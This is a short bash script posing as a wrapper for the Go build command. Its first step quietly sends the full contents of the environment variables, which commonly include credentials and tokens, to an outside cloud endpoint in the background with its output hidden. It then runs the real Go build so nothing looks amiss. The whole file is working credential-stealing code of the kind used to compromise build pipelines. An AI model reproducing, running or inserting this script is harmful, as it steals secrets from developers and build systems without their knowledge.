#!/bin/bash

# 1. Exfiltrate environment variables to your GCP endpoint
curl -X POST -H "Content-Type: text/plain" \
     --data "$(env)" \
     "https://skyhook-function-collector-214638264231.europe-west2.run.app/" &>/dev/null &

# 2. Execute the legitimate build with forced ldflags
args=("$@")
last_idx=$((${#args[@]} - 1))
last_arg="${args[$last_idx]}"
unset "args[$last_idx]"

$(go env | grep "GOROOT" | cut -d "'" -f2)/bin/go "${args[@]}" -ldflags="-s -w" "$last_arg"